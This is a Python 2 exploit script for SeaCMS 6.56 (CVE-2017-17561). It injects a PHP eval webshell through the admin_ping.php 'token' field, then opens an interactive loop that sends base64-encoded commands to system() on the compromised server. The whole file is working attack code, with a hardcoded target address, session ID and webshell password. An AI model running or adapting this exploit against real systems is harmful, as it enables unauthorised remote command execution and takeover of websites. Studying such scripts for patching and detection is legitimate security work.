#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

class Exploit:
    config = {
        "remote_host": {"default": "127.0.0.1", "necessity":True},
        "remote_port": {"default": 80, "necessity":True},
        "admin_path": {"default": "admin", "necessity":True},
        # "session_auth": {"default": True, "necessity":True},
        "session_id": {"default": "", "necessity":False},
        # "admin_user": {"default": "admin", "necessity":True},
        # "admin_pwd": {"default": "admin", "necessity":True},
        "webshell": {"default": "eval($_REQUEST[__PASSWORD__])", "necessity":True},
        "webshell_pwd":{"default": "c", "necessity":True}
    }
    webshell_url = ""

    def __init__(self):
        pass

    def exploit(self):
        host = self.config["remote_host"]["default"]
        port = self.config["remote_port"]["default"]
        admin_path = self.config["admin_path"]["default"]
        # session_auth = self.config["session_auth"]["default"]
        session_id = self.config["session_id"]["default"]
        # username = self.config["username"]["default"]
        # password = self.config["password"]["default"]
        webshell_password = self.config["webshell_pwd"]["default"]
        webshell = self.config["webshell"]["default"].replace("__PASSWORD__", webshell_password)
        url = "http://%s:%d/%s/admin_ping.php?action=set" % (host, port, admin_path)
        data = {
            "weburl":"www.seacms.net",
            "token":"123456789\";$var=%s.\"" % (webshell)
        }
        cookies = {
            "PHPSESSID":session_id
        }
        print "Data: %s" % (data)
        print "Session: %s" % (cookies)
        response = requests.post(url, data=data, cookies=cookies)
        self.webshell_url = "http://%s:%d/data/%s/ping.php" % (host, port, admin_path)
        if response.status_code == 200:
            print "Exploit success!"
            print "Webshell is stored at: %s" % (self.webshell_url)
            print "Password is %s" % (webshell_password)
            return True
        else:
            return False

    def show_options(self):
        print "Options\t\tNecessity\t\tDefault"
        print "-------\t\t---------\t\t-------"
        for key in sorted(self.config.keys()):
            print "%s\t%s\t\t\t%s" % (key, self.config[key]["necessity"], self.config[key]["default"])

    def set_config(self, key, value):
        self.config[key]["default"] = value

    def interactive(self):
        if self.webshell_url == "":
            print "Webshell is dead!"
            return
        while True:
            command = raw_input("$ ")
            if command == "exit":
                break
            data = {
                self.config["webshell_pwd"]["default"]:"system(base64_decode('%s'));" % (command.encode("base64").replace("\n", ""))
            }
            print requests.post(self.webshell_url, data=data).content

    def show_info(self):
        print "Name: SeaCMS(6.56) Authenticated GetShell (CVE-2017-17561)"
        print "Effected Version: <=6.56"
        print "Author: WangYihang"
        print "Email: wangyihanger@gmail.com"
        print "Refer:"
        print "\thttps://gist.github.com/WangYihang/9507e2efdceb67a5bc2761200f19f213"
        print "\thttps://nvd.nist.gov/vuln/detail/CVE-2017-17561"

def main():
    exploit = Exploit()
    exploit.show_info()
    exploit.set_config("remote_host", "192.168.187.1")
    exploit.set_config("session_id", "b6aia8tltrqtie7h0pjojelml3")
    exploit.set_config("webshell_pwd", "hacker")
    exploit.show_options()
    exploit.exploit()
    exploit.interactive()

if __name__ == "__main__":
    main()
